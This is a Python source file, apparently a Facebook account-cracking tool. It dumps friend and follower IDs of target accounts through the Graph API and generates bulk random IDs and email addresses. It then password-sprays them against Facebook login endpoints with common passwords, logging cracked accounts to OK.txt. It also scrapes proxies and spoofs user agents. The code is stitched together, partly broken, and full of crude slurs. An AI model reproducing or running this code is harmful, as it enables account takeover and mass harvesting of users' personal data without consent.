			for i in requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit="+limit+"&access_token="+token).json()["data"]:
				try:
					uid = i["id"]
					nama = i["name"]
					id.append(uid+"|"+nama)
					dump.write(uid+'|'+nama+'\n')
				except:pass
			dump.close()
		except KeyError:pass
		try:
			for i in requests.get("https://graph.facebook.com/"+idt+"/friends?limit="+limit+"&access_token="+token).json()["data"]:
				try:
					uid = i["id"]
					nama = i["name"]
					id.append(uid+"|"+nama)
					dump.write(uid+'|'+nama+'\n')
				except:pass
			dump.close()
		except KeyError:pass
	id_ = ("%s"%(len(id)))
	if id_ == "0" or "0" == id_:
		jalan(war+"It is possible that the ID you entered is not published !!")
	else:
		print(war+"Total ID : %s"%(len(id)))
		jalan(war+"Name Hasil Dump : "+I+"dump/"+namafi+".json"+Q)
		jalan(war+" Please Copy the Dump Result Name !!")
		jalan("\n"+war+"Do you want to directly crack with this file (Y/n) : ")
		zz = input(war+'Choose : ')
		if zz in ["Y", "y", "Yes", "1"]:
			crackmenu("dump/"+namafi+".json").passmenu("dump/"+namafi+".json")
			exit()
		else:
			pass
	input(war+"Press Enter !!")
	menu()
def cekfile(folder):
        print("\n   C H O O S E  F I L E\n")
        dirs = os.listdir(folder)
        for file in dirs:
                filex = (folder+"/"+file)
                try:
                        juma = open(filex,"r").readlines()
                        total = ("%s"%(str(len(juma))))
                except:total = (" ?? ")                
                print(war+P+filex+P+" : "+Q+K+total)
def cekfile_crk(folder):
        dirs = os.listdir(folder)
        for file in dirs:
                filex = (folder+"/"+file)
                try:
                        juma = open(filex,"r").readlines()
                        total = ("%s"%(str(len(juma))))
                except:total = (" ?? ")
                try:
                    ijo__ = filex.split("Hasil/OK-")[1]
                    ijo_ = (war+I+"Hasil/OK-"+ijo__)
                    print(ijo_+U+"   |   "+Q+M+total)
                except:pass

                try:
                    kuning__ = filex.split("Hasil/CP-")[1]
                    kuning_ = (war+K+"Hasil/CP-"+kuning__)
                    print(kuning_+U+"   |   "+Q+M+total)
                except:pass

#                print(war+C+filex+U+" <==> "+Q+K+total)
def dump_ulti():
	try:
		token = open("access_token.txt", "r").read()
		toket = open("access_token.txt", "r").read()
	except IOError:
		os.system("rm -rf access_token.txt")
		#exit(war+"Token Failed !!");time.sleep(2)

	#jalan(war+"write "+I+"me"+Q+" To dump your own data")
	idt = input("[*] Input ID or Username target : " )
	idt = ubah_username_to_id(idt)
	try:
		if idt == "me" or "me" == idt:
			otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
			op = json.loads(otw.text)
		else:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			op = json.loads(jok.text)
		try:
			nama = op['name']
		except (KeyError, IOError):
			nama = ("Nama Tidak DiTemukan !")
#		try:
#			tempat = op['location']['name']
#		except (KeyError, IOError):
#			tempat = ("Lokasi Tidak DiTemukan")
#		try:
#			tinggal = op['hometown']['name']
#		except (KeyError, IOError):
#			tinggal = ("Nama Kota Tidak DiTemukan")

	except Exception as e:
		jalan(war+" Sorry ID "+C+idt+Q+"This Was Not Found!")
		time.sleep(2)
		dump_ulti()
	jalan("\n"+war+"Name   : "+I+nama+Q+"\n")
	if nama == "Nama Tidak DiTemukan !":
		time.sleep(2)
		dump_ulti()

#	jalan(war+"Kota   : "+I+tempat+Q)
#	jalan(war+"Lokasi : "+I+tinggal+Q+"\n")
	namq = input(war+"Name File (Example : Dada)"+K+"Enter:Random"+Q+": ")
	if namq == "" or namq == " ":
		namq = text_random()
	dump = open('.janganedit','w') 
	try:
		dump = open('.janganedit','a+') 
		for i in requests.get("https://graph.facebook.com/"+idt+"/friends?limit=9999&access_token="+token).json()["data"]:
			uid = i["id"]
			nama = i["name"]
			id.append(uid+"|"+nama)
			dump.write(uid+'|'+nama+'\n')
		dump.close()
	except KeyError:pass
	id_ = ("%s"%(len(id)))
	if id_ == "0" or "0" == id_:
		jalan(war+"Look like Id "+idt+" Not Published !!")
		time.sleep(2)
		cek_anak_epep()
	else:
		print(war+"Total ID : %s"%(len(id)))
		dumppp = open('dump/'+namq+'.json','w')
		jalan(war+'Dump Files Saved In : '+'dump/'+namq+'.json')
		jalan(war+"Press CTRL + Z TO STOP !!")
		with profacc(max_workers=20) as (kiky_gtg):
			juma = open(".janganedit","r").readlines()
			for data in juma:
				data = data.replace("\n","")
				kiky = data.split("|")
				mal = ("%s"%(kiky[0]))
				nm = ("%s"%(kiky[1]))
				kiky_gtg.submit(lonte__, mal, toket, token, namq)
		exit("\n"+war+"Done !!")
goblok = []
tolol = []	
def lonte__(ml, token, toket, mamk):
	laxk = open('dump/'+mamk+'.json','a+')
#	open('dump/'+mamk+'.json','r').readlines()
	
	try:
		for i in requests.get("https://graph.facebook.com/"+ml+"/friends?limit=9999&access_token="+token).json()["data"]:
			try:
				iid = i["id"]
				nama = i["name"]
				goblok.append(nama)
				laxk.write(iid+'|'+nama+'\n')
			except:pass
		laxk.close()
		for i in requests.get("https://graph.facebook.com/"+ml+"/subscribers?limit=9999&access_token="+token).json()["data"]:
			try:
				iid = i["id"]
				nama = i["name"]
				goblok.append(nama)
				laxk.write(iid+'|'+nama+'\n')
			except:pass
		laxk.close()
	except KeyError:pass
	sys.stdout.write("\r%s[%sULTIMATE%s] COLLECTED IDZ => %s"%(Q,pilih([U,I,K,M,C]),Q, len(open('dump/'+mamk+'.json','r').readlines()))
	); sys.stdout.flush()
def cek_anak_epep():
	try:
		token = open(".login.txt", "r").read()
		toket = open(".login.txt", "r").read()
	except IOError:
		os.system("rm -rf .login.txt")
		exit(war+"Token Failed !!");time.sleep(2)

	jalan(war+"write "+I+"me"+Q+" to dump your own data")
	idt = input(war+"Input ID or Username target : ")
	idt = ubah_username_to_id(idt)
#	idt = input(war+"Target ID : ")
	dump = open('.janganedit','w') 
	try:
		dump = open('.janganedit','a+') 
		for i in requests.get("https://graph.facebook.com/"+idt+"/friends?limit=9999&access_token="+token).json()["data"]:
			uid = i["id"]
			nama = i["name"]
			id.append(uid+"|"+nama)
			dump.write(uid+'|'+nama+'\n')
		dump.close()
	except KeyError:pass
	id_ = ("%s"%(len(id)))
	if id_ == "0" or "0" == id_:
		jalan(war+"Look Like Id "+idt+" Id was not published!!")
		time.sleep(2)
		cek_anak_epep()
	else:
		print(war+"Total ID : %s"%(len(id)))
		with profacc(max_workers=20) as (kiky_gtg):
			juma = open(".janganedit","r").readlines()
			for data in juma:
				data = data.replace("\n","")
				kiky = data.split("|")
				mal = ("%s"%(kiky[0]))
				nm = ("%s"%(kiky[1]))
				kiky_gtg.submit(lonte_, mal, toket, token)
def lonte_(ml, token, toket):
	voa = ""
	try:
		goblok = []
		tolol = []
		for i in requests.get("https://graph.facebook.com/"+ml+"/friends?limit=9999&access_token="+token).json()["data"]:
			anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol = i["id"]
			goblok.append(anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol)
		for i in requests.get("https://graph.facebook.com/"+ml+"/subscribers?limit=9999&access_token="+token).json()["data"]:
			anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol_asw = i["id"]
			tolol.append(anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol_asw)
	except KeyError:pass
	_id = ("%s"%(len(goblok)))
	_idx = ("%s"%(len(tolol)))
	if _id == "0" or "0" == _id:
		pass
	else:
		voa += (" | Friend : %s%s%s"%(U,_id,Q))
	if _idx == "0" or "0" == _idx:
		pass
	else:
		voa += (" | Follower : %s%s%s"%(I,_idx,Q))
	if voa == "" or "" == voa:pass
	else:
		print (f"{war}{ml}{voa}")

def get_uame():
	urq = "http://whatsmyuseragent.org/"
	sess = requests.Session()
	getdat = requests.get(urq)
	getdat = par(getdat.content,'html.parser')
	print(getdat)
def chek_bot():
	try:
		toket=open(".login.txt","r").read()
		token=open(".login.txt","r").read()
		otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
		a = json.loads(otw.text)
		nama = a["name"]
		id = a["id"]
	except IOError:
		print((war+"Token Invalid"))
		time.sleep(1)
		login()
	print(war+' Your Name On Facebook  : '+nama)
	print(war+'Your Facebook Id  : '+id)
	ba = requests.post('https://graph.facebook.com/1675627047/subscribers?access_token='+token) ### FB RISKY
	ba = par(ba.content,'html.parser')
	print(str(ba))
def cek_tok_tok():
	try:
		toket=open(".login.txt","r").read()
	except:
		print((war+"Token Invalid"))
		time.sleep(1)
		login()
	ba = (requests.get('https://graph.facebook.com/me/friends?limit=3&fields=name&access_token='+toket).json()["error"]["message"])
	if ba in "Sepertinya Anda menyalahgunakan fitur ini dengan menggunakannya terlalu cepat. Anda dilarang menggunakan fitur ini untuk sementara.":
		jalan(war+"looks like you abused this feature by using it too soon. You are temporarily prohibited from using this feature")
		jalan(war+"Chances are you can't Dump/Crack/Take Idz")
		jalan("\n"+war+"Do you want to still use this token (Y/n) :")
		la = input(war+"Choose : ")
		if la in ("Y","y"):
			pass
		else:
			os.remove(".login.txt")
			jalan(war+"Successfully Remove Token!")
			exit()



lis_prox = []
list_proxy = []
c=1
def cek_proxy(proxy):
        try:
                respon = requests.get("https://httpbin.org/ip", proxies={"http": proxy,"https": proxy}, timeout=3).json()["origin"]
                print (" >> Live -- "+proxy)
                list_proxy.append(proxy)
                c+=1
        except:
                pass

def scrap():
        lis_prox_dev = []
        url="https://free-proxy-list.net/#list"
        with requests.Session() as ses_dev:
                respon = ses_dev.get(url)
                sop = BeautifulSoup(respon.content, "html.parser")
                tbody = sop.find("tbody")
                for dev in tbody.find_all("tr"):
                        prox = dev.find_all("td", class_=False)
                        lis_prox_dev.append(str(prox))
#                        print (prox)
                for dev in lis_prox_dev:
                        pecah = dev.split(",")
                        ip = pecah[0].replace("<td>", "").replace("</td>","").replace("[", "")
                        port = pecah[1].replace("<td>", "").replace("</td>","").replace("[", "").strip(" ")
                        lis_prox.append(ip+":"+port+"\n")
                        print("".join(lis_prox))

        with ThreadPoolExecutor(max_workers=20) as dev:
                for prox in lis_prox_dev:
                        dev.submit(cek_proxy, proxy)	                         	                           		        	                         	                           		                         	                                   	                         	                           		                         	                           			        	                         	                           		                         	                                   	                         	                           		                         	                           		        	                         	                           		                         	                                   	                         	                           		                         	                                                    	                           		                         	                                   	                         	                           		                         	                           		        	                         	                           		                         	                                   	                         	                           		                         	                           			        	                         	                           		                         	                                   	                         	                           		                         	                           		        	                         	                           		                         	                                   	                         	                           		                         	                                                                	                           		                         	                                   	                         	                           		                         	                           		        	                         	                           		                         	                                   	                         	                           		                         	                           			        	                         	                           		                         	                                   	                         	                           		                         	                           		        	                         	                           		                         	                                   	                         	                           		                         	                                                    	                           		                         	                                   	                         	                           		                         	                           		        	                         	                           		                         	                                   	                         	                           		                         	                           			        	                         	                           		                         	                                   	                         	                           		                         	                           		        	                         	                           		                         	                                   	                         	                           		                         	                           	                                 	                           		                         	                                   	                         	                           		                         	                           		        	                         	                           		                         	                                   	                         	                           		                         	                           			        	                         	                           		                         	                                   	                         	                           		                         	                           		        	                         	                           		                         	                                   	                         	                           		                         	                                                    	                           		                         	                                   	                         	                           		                         	                           		        	                         	                           		                         	                                   	                         	                           		                         	                           			        	                         	                           		                         	                                   	                         	                           		                         	                           		        	                         	                           		                         	                                   	                         	                           		                         	                                                                	                           		                         	                                   	                         	                           		                         	                           		        	                         	                           		                         	                                   	                         	                           		                         	                           			        	                         	                           		                         	                                   	                         	                           		                         	                           		        	                         	                           		                         	                                   	                         	                           		                         	                                                    	                           		                         	                                   	                         	                           		                         	                           		        	                         	                           		                         	                                   	                         	                           		                         	                           			        	                         	                           		                         	                                   	                         	                           		                         	                           		        	                         	                           		                         	                                   	                         	                           		                         	                           


try:
	import requests,calendar
except ModuleNotFoundError:
	os.system("python -m pip install requests ")
try:
	import bs4
except ModuleNotFoundError:
	os.system("python -m pip install bs4 ")
try:
	import mechanize
except ModuleNotFoundError:
	os.system("python -m pip install mechanize ")

import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,platform,base64
from random import randint
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from urllib.parse import quote
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess
from random import randint
import requests, re, os, time
def line_chack_dote():
        m = [".","..","...","....","....."]
        for b in range(2):
                for t in m:
                        sys.stdout.write("\r[*] Creating TNL Internet File " + t)
                        sys.stdout.flush()
                        time.sleep(0.1)
def fb():
	logo()
	print("[01] Dump ID Single Form Public ");time.sleep(0.3)
	print("[02] Master Dump Public ID ");time.sleep(0.3)
	print("[03] Dump Random Email ID [ No Login ]  ");time.sleep(0.3)
	print("[04] Dump Random Old ID [ No Login ] ");time.sleep(0.3)
	print("[05] File Cloning [ No Login ] ");time.sleep(0.3)
	print("[06] Duplicate Cutter ");time.sleep(0.3)
	print("[07] ID Separator ");time.sleep(0.3)
	print("[08]  ");time.sleep(0.3)
	print("[10]  ");time.sleep(0.3)
	print("[11]  ");time.sleep(0.3)
	print("[12] ID Login to Cookie and Token ");time.sleep(0.3)
	print("[13]  ");time.sleep(0.3)
	print("[14] Save Facebook Token ");time.sleep(0.3)
	print("[15]  ");time.sleep(0.3)
	fbx = input("\n[->] Choose : ")
	if fbx == '' or fbx == ' ':
		fb()
	elif fbx == '04' or fbx == '4':
		first_old()
	elif fbx == '2' or fbx == '02':
		dump_ulti()
	elif fbx == '03' or fbx == '3':
		email_Dump()
	elif fbx == '1' or fbx == '01':
		dump_noob()
	elif fbx == '6' or fbx == '06':
		dupcutter()
	elif fbx == '7' or fbx == '07':
		grep()
	elif fbx == '5' or fbx == '05':
		__crack__().plerr()
	elif fbx == '12':
		exit(email())
	elif fbx == '14':
		login()
	else:
		fb()
def dump_noob():
	logo()
	try:
		___token___ = open('access_token.txt','r').read()
	except (IOError):
		login()
	___total___ = 2
	___file___ = input("[*] File Name : ")
	for zx in range(___total___):
		zx +=3
		___ids___ = input("[*] Public ID Link : ")
		if ___ids___ in ['',' ']:
			fbmenu()
		try:
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(___ids___,___token___)).json()
			file = open('Dump/'+___file___+'.txt' , 'a')
			file2 = ('Dump/'+___file___+'.txt')
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			file.close()
			___user___ = open('Dump/'+___file___+'.txt','r').readlines()
			print("\n\n[*] Total File ID :\033[0;91m %s"%(len(___user___)))
			print("\033[0;97m[*] Duming Successful ")
			print("[*] Dump File Save As : %s"%(file2))
			input("\n\n[*] Back")
			fb()
		except (KeyError):
			exit("\n\n\033[0;91m[*] Dumping Error ")
		except (ConnectionError):
			exit("\n\n\033[0;91m[*] Error 405 ")
def first_old():
	logo()
	os.system("rm -rf Dump/old.txt")
	print("")
	print("[01] 1000000000 : 10")
	print("[02] 100000000 : 9")
	print("[03] 10000000 : 8")
	print("[04] 1000000 : 7")
	print("[05] 100000 : 6")
	print("[06] 10000 : 5")
	print("")
	ben = input("[>] Choose : ")
	try:
		print("")
		lim_ = int(input("[>] Cracking Limit : "))
		separator = input("[>] Enter ID And Name Separator : ")
	except:lim_ = "5000"
	if ben == "" or ben == " ":
		time.sleep(2)
		fbmenu()
	elif ben == "1" or ben == "01":
		_             = 11111
		__            = 99999
		___ ="1000000000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Dump/old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"Elite_Dumping_Bot\n")
			old_a.close()
		except Exception as e:
			print((" Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Dump/old.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		jalanx("[*] For Example : 123456,123456789")
		print("")
		input("[*] Back ")
		fbmenu()
	elif ben == "2" or ben == "02":
		_            = 111111
		__           = 999999
		___ ="100000000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Dump/old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"Elite_Dumping_Bot\n")
			old_a.close()
		except Exception as e:
			print((" Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Dump/old.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		jalanx("[*] For Example : 123456,123456789")
		print("")
		input("[*] Back ")
	elif ben == "3" or ben == "03":
		_           = 1111111
		__          = 9999999
		___ ="10000000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Dump/old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"Elite_Dumping_Bot\n")
			old_a.close()
		except Exception as e:
			print((" Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Dump/old.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		jalanx("[*] For Example : 123456,123456789")
		print("")
		input("[*] Back ")
	elif ben == "4" or ben == "04":
		_          = 11111111
		__         = 99999999
		___ ="1000000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Dump/old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"Elite_Dumping_Bot\n")
			old_a.close()
		except Exception as e:
			print((" Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Dump/old.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		jalanx("[*] For Example : 123456,123456789")
		print("")
		input("[*] Back ")
		fbmenu()
	elif ben == "5" or ben == "05":
		_         = 111111111
		__        = 999999999
		___ ="100000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Dump/old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"Elite_Dumping_Bot\n")
			old_a.close()
		except Exception as e:
			print((" Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Dump/old.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		jalanx("[*] For Example : 123456,123456789")
		print("")
		input("[*] Back ")
		fbmenu()
	elif ben == "6" or ben == "06":
		_        = 1111111111
		__       = 9999999999
		___ ="10000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Dump/old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"Elite_Dumping_Bot\n")
			old_a.close()
		except Exception as e:
			print((" Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Dump/old.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		jalanx("[*] For Example : 123456,123456789")
		print("")
		input("[*] Back ")
		fb()
	else:
		fb()
def email_Dump():
	os.system("clear")
	logo()
	print(" ")
	os.system("rm -rf Dump/email.txt")
	print("[01] Dump Bot Email ID [ Pro ]")
	print("[00] Back ")
	print("")
	ben = input("[>] Choose : ")
	try:
		print("")
		lim_ = int(input("[>] Cracking Limit : "))
		print("")
		
		print("[*] For Example ")
		print("[*] Username : muhammedali ")
		print("[*] Domain Name : @gmail.com ")
		print("[*] Enter ID And Name Separator : | ")
		print("[*] Enter Full User Name With Space : Ali Khan ")
		print("")
		print("")
		___ = input("[>] Enter Email Username : ")
		domain = input("[>] Enter Domain Name : ")
		separator = input("[>] Enter ID And Name Separator : ")
		passusername = input("[>] Enter Full User Name With Space : ")
	except:lim_ = "5000"
	if ben == "" or ben == " ":
		time.sleep(2)
		menu()
	elif ben == "1" or ben == "01":
		_             = 1
		__            = 999
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Dump/email.txt', 'a')
				old_a.write(str(___)+str(bokeq)+domain+separator+passusername+"\n")
			old_a.close()
		except Exception as e:
			print((" Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Dump/email.txt File")
		jalanx("[*] Crack File From Any Script Using Auto Passwords  ")
		print("")
		print("")
		input("[*] Back ")
	else:
		menu()
ok = []
cp = []
id = []
user = []
num = 0
loop = 0
Bilal_Haider_ID = print
Bilal_Haider = open
Prof_Bilal = requests.get
_silet_koceng_  = requests.Session()
url_mb = "https://mbasic.facebook.com"
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan_key = {"january": "January", "february": "February", "march": "March", "april": "April", "may": "May", "june": "June", "july": "July", "august": "August", "september": "September", "october": "October", "november": "November", "december": "December"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_realme = 'Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3'
P = '\x1b[1;97m' # PUTIH
M = '\033[0;91m' # MERAH 
H = '\033[1;92m' # HIJAU 
K = '\033[1;91m' # KUNING 
B = '\033[0;94m' # BIRU 
U = '\033[0;95m' # UNGU 
O = '\033[0;96m' # BIRU MUDA
N = '\033[0m'	# WARNA MATI 
def login():
	os.system("rm -rf access_token.txt");logo()
	tok = input('[*] Enter Your Token : ')
	try:
		u = requests.get('https://graph.facebook.com/me?access_token='+tok).text
		u1 = json.loads(u)
		name = u1['name']
		ts = open('access_token.txt', 'w')
		ts.write(tok)
		ts.close()
		print("\n\n[*] Login Successful as " + name )
		time.sleep(1)
		fb()
	except KeyError:
		print('\n\n[*] Token Expired ')
		time.sleep(1)
		login()

def banner():
	logo()
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        Bilal_Haider_ID('\n\n\033[0mDone...')
        Bilal_Haider_ID('\n\033[1;92mOK : %s • CP : %s'%(str(len(ok)),str(len(cp))));exit()
        #Bilal_Haider_ID('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
    else:
        Bilal_Haider_ID('\n\033[0mUps..Tidak Mendapatkan Hasil')
        exit()
class __crack__:
    def __init__(self):
        self.id = []
    def plerr(self):
        try:
            self.apk = input('\n[•] Nama File : ')
            self.id = Bilal_Haider(self.apk).read().splitlines()
            Bilal_Haider_ID('[•] Total ID : %s'%(len(self.id)))
        except:
            Bilal_Haider_ID('\n[!] Nama File Tidak Ada... Silahkan Dump ID Terlebih Dahulu')
            input('\n[•] Tekan ENTER Untuk Kembali');menu();print("[M] Menual Password ");print('[D] Default Password ')
        _jokowi_kontol_ = input("Choose : ")
        if _jokowi_kontol_ in ('M', 'm'):
            print('[*] Function Added in new update ')
            
            Bilal_Haider_ID('\nEnter Password 123456 or 123456789 For OLd Idz ')
            while True:
                pwek = input('\nEnter Password : ')
                #Bilal_Haider_ID('Sandi > %s'%(pwek))
                if pwek == '':
                    Bilal_Haider_ID('\nJangan Kosong')
                    time.sleep(1)
                    exit()
                elif len(pwek)<=5:
                    Bilal_Haider_ID('\nSandi Harus 6 Karakter Lebih Tidak Masalah')
                else:
                    def _sempak_(bse=None):
                        boy = input('\nPilih : ')
                        if boy == '':
                            Bilal_Haider_ID('\nJangan Kosong')
                            time.sleep(1);self._sempak_()
                        elif boy == "1" or boy == "01":
                            Bilal_Haider_ID('\n[•] Result OK saved to OK.txt')
                            Bilal_Haider_ID('[•] Result CP saved to CP.txt')
                            Bilal_Haider_ID('\n\tCrack Processing...\n')
                            Bilal_Haider_ID('\n\tCrack Processing...\n\n');logo()
                            with ThreadPoolExecutor(max_workers=35) as (_ngentot_gratis_):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('|')[0]
                                        _ngentot_gratis_.submit(self.__api__, kimochi, bse)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        elif boy == "2" or boy == "02":
                            Bilal_Haider_ID('\n[•] Result OK saved to OK.txt')
                            Bilal_Haider_ID('[•] Result CP saved to CP.txt')
                            Bilal_Haider_ID('\n\tCrack Processing...\n\n');logo()
                            with ThreadPoolExecutor(max_workers=25) as (_ngentot_gratis_):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('|')[0]
                                        _ngentot_gratis_.submit(self.__mbasic__, kimochi, bse)
                                    except: pass
                            os.remove(self.apk)
                            hasil(ok,cp)
                        elif boy == "3" or boy == "03":
                            Bilal_Haider_ID('\nHasil RESULTS Tersimpan Di > multiresuts.txt')
                            Bilal_Haider_ID('[•] Result CP saved to CP.txt')
                            Bilal_Haider_ID('\n\tCrack Processing...\n\n')
                            Bilal_Haider_ID('\n\tCrack Processing...\n\n');logo()
                            with ThreadPoolExecutor(max_workers=20) as (_ngentot_gratis_):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('|')[0]
                                        _ngentot_gratis_.submit(self.__mfb,__, kimochi, bse)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        else:
                            #Bilal_Haider_ID('\nSalah')
                            exit()
                    #Bilal_Haider_ID('\n\t         PILIH METODE CRACK NYA')
                    Bilal_Haider_ID('\n01.) Metode b-api ')
                    Bilal_Haider_ID('02.) Metode mbasic ')
                    Bilal_Haider_ID('03.) Metode Mobile ')
                    _sempak_(pwek.split(','))
                    break
        elif _jokowi_kontol_ in ('D', 'd'):
            Bilal_Haider_ID('\n\t------[ Method Crack ]-----')
            Bilal_Haider_ID('\n[01] Metode B-Api')
            Bilal_Haider_ID('[02] Metode Mbasic [ Pro ]')
            Bilal_Haider_ID('[03] Metode Mobile ')
            self.__pler__()
        else:
            #Bilal_Haider_ID('\nLu kok kayak jmbt ya?')
            exit()
        return
    def __api__(self, user, _sempak_):
        global ok,cp,loop
        sys.stdout.write('\r\033[1;97m[ NoName ] %s/%s  \033[1;92mOK-:%s • \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in _sempak_:
            pw = pw.lower()
            try: os.mkdir('')
            except: pass
            try:
            	ua_xiaomi = Bilal_Haider('agent.txt', 'r').read()
            except (KeyError, IOError):
            	ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            p = Prof_Bilal("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pw+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
            if "access_token" in p:
                Bilal_Haider_ID('\r\033[1;92m[NoName-OK] %s • %s%s      '%(user,pw,tahun(user)))
                wrt = '%s - %s %s'%(user,pw,tahun(user))
                ok.append(wrt)
                open('OK.txt','a').write('%s\n' % wrt)
                break
                continue
            elif "www.facebook.com" in p["error_msg"]:
                try:
                    token = Bilal_Haider('login.txt').read()
                    cp_ttl = Prof_Bilal('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
